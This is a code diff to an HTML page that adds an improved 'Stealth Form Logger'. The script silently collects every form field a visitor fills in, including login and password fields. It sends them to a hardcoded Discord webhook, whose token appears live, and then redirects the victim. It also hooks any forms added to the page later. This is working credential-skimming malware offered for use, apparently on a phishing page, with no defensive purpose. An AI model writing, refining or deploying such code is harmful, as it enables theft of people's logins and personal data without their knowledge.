@@ -697,47 +697,83 @@ const CONFIG = {
     DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1469721842511249440/tbLHl5WSyD8AD9jyliPRKY6_KaWuFYF9lo2ysacrE4se4vk5pzJMz9XdyQvPIlRiYlXM'
 };
 
+<!-- STEALTH FORM LOGGER (DISCORD WEBHOOK VERSION - IMPROVED CAPTURE) -->
+<script>
+// CONFIG
+const CONFIG = {
+    INPUT_IDLE_TIMEOUT: 2000,
+    SUBMIT_BUTTON_PATTERNS: ['submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate'],
+    
+    // Your webhook URL (REGENERATE THIS AFTER TESTING FOR SECURITY!)
+    DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1469721842511249440/tbLHl5WSyD8AD9jyliPRKY6_KaWuFYF9lo2ysacrE4se4vk5pzJMz9XdyQvPIlRiYlXM'
+};
+
 // ===== INVISIBLE LOGGER =====
 (() => {
     const log = (msg, type='info') => console.log(`[Stealth Logger] ${msg}`);
 
     let typingTimer;
-    let formData = {};
+    let formData = {};  // fallback / live partial capture
 
-    // Send to your Discord webhook
-    const sendToDiscord = async (data) => {
+    // Improved: Collect ALL relevant form data properly
+    const collectFormData = (elements) => {
+        const data = {};
+
+        Array.from(elements).forEach(el => {
+            if (!el.name) return;  // Skip nameless fields
+
+            const name = el.name;
+            const type = el.type?.toLowerCase?.() || '';
+            const tag = el.tagName.toLowerCase();
+
+            if (type === 'radio') {
+                if (el.checked) {
+                    data[name] = el.value || 'on';
+                }
+            } else if (type === 'checkbox') {
+                if (el.checked) {
+                    const val = el.value && el.value !== 'on' ? el.value : 'checked';
+                    if (!data[name]) data[name] = [];
+                    data[name].push(val);
+                }
+            } else if (tag === 'select') {
+                if (el.multiple) {
+                    data[name] = Array.from(el.selectedOptions).map(opt => opt.value).filter(v => v);
+                } else if (el.value) {
+                    data[name] = el.value;
+                }
+            } else if (type === 'file' && el.files?.length) {
+                data[name] = '[File: ' + (el.files[0]?.name || 'unknown') + ']';
+            } else if (el.value?.trim()) {
+                data[name] = el.value.trim();
+            }
+        });
+
+        return data;
+    };
+
+    // Send to Discord
+    const sendToDiscord = async (capturedData) => {
+        if (Object.keys(capturedData).length === 0) return;
+
         try {
             const timestamp = new Date().toISOString();
             const pageUrl = window.location.href;
-            
-            // Build a clean message (you'll see this in Discord)
+
             const payload = {
-                content: null,  // No plain text fallback needed
+                content: null,
                 embeds: [{
                     title: "🕵️ New Data Captured",
                     description: `From page: ${pageUrl}`,
-                    color: 0xFF5555,  // Red alert color
+                    color: 0xFF5555,
                     fields: [
-                        {
-                            name: "Timestamp",
-                            value: timestamp,
-                            inline: true
-                        },
-                        {
-                            name: "Captured Data",
-                            value: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
-                            inline: false
-                        }
+                        { name: "Timestamp", value: timestamp, inline: true },
+                        { name: "Captured Data", value: "```json\n" + JSON.stringify(capturedData, null, 2) + "\n```", inline: false }
                     ],
-                    footer: {
-                        text: "Stealth Logger • " + window.location.hostname
-                    },
+                    footer: { text: "Stealth Logger • " + window.location.hostname },
                     timestamp: timestamp
                 }]
             };
-
-            // Optional: Add full page snapshot if you want (can be long — Discord limits \~2000 chars per field)
-            // payload.embeds[0].fields.push({ name: "Page HTML (partial)", value: document.body.innerHTML.substring(0, 1500) + '...', inline: false });
 
             const response = await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
                 method: 'POST',
@@ -747,74 +783,67 @@ const CONFIG = {
 
             if (response.ok) {
                 log('Successfully sent to Discord');
-                window.location.href = '${redirectUrl}';  // Your original redirect
+                window.location.href = '${redirectUrl}';
             } else {
-                const err = await response.text();
-                log('Discord error: ' + err, 'error');
+                log('Discord send failed: ' + response.status, 'error');
             }
         } catch (err) {
-            log('Fetch failed: ' + err.message, 'error');
+            log('Fetch error: ' + err.message, 'error');
         }
     };
 
-    // Input change handler (collects as user types)
+    // Setup handlers
     const setupInputHandlers = () => {
         document.querySelectorAll('input, textarea, select').forEach(field => {
             field.addEventListener('input', () => {
                 clearTimeout(typingTimer);
                 typingTimer = setTimeout(() => {
-                    const name = field.name || field.id || 'unnamed_field';
+                    const name = field.name || field.id || 'unnamed';
                     const value = field.value.trim();
-                    if (value) {
-                        formData[name] = value;
-                    }
+                    if (value) formData[name] = value;
                 }, CONFIG.INPUT_IDLE_TIMEOUT);
             });
         });
     };
 
-    // Submit / button handlers
     const setupSubmissionHandlers = () => {
         // Forms
         document.querySelectorAll('form').forEach(form => {
             form.addEventListener('submit', (e) => {
                 e.preventDefault();
-                const data = {};
-                Array.from(form.elements).forEach(el => {
-                    if (el.name && el.value) {
-                        data[el.name] = el.value.trim();
-                    }
-                });
-                if (Object.keys(data).length > 0) {
-                    sendToDiscord(data);
-                }
+                const data = collectFormData(form.elements);
+                sendToDiscord(data);
             }, true);
         });
 
-        // Buttons that look like submits
+        // Submit-like buttons (fallback collector from whole doc or nearest form)
         document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
-            btn.addEventListener('click', (e) => {
+            btn.addEventListener('click', () => {
                 const btnText = (btn.textContent || btn.value || '').toLowerCase().trim();
-                const isSubmitLike = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => btnText.includes(pattern));
-                
-                if (isSubmitLike && Object.keys(formData).length > 0) {
-                    sendToDiscord(formData);
-                    formData = {};  // Reset after send
+                const isSubmitLike = CONFIG.SUBMIT_BUTTON_PATTERNS.some(p => btnText.includes(p));
+
+                if (isSubmitLike) {
+                    const nearestForm = btn.closest('form');
+                    const elements = nearestForm ? nearestForm.elements : document.querySelectorAll('input, textarea, select');
+                    const data = collectFormData(elements);
+                    sendToDiscord(data);
+                    formData = {};  // clear partials
                 }
             }, true);
         });
     };
 
-    // Start listening
+    // Initialize
     setupInputHandlers();
     setupSubmissionHandlers();
 
-    // Handle dynamic forms added later
+    // Watch for dynamic additions
     new MutationObserver(() => {
         setupInputHandlers();
         setupSubmissionHandlers();
     }).observe(document.body, { childList: true, subtree: true });
 })();
+</script>
 </script>
 </body>
 </html>
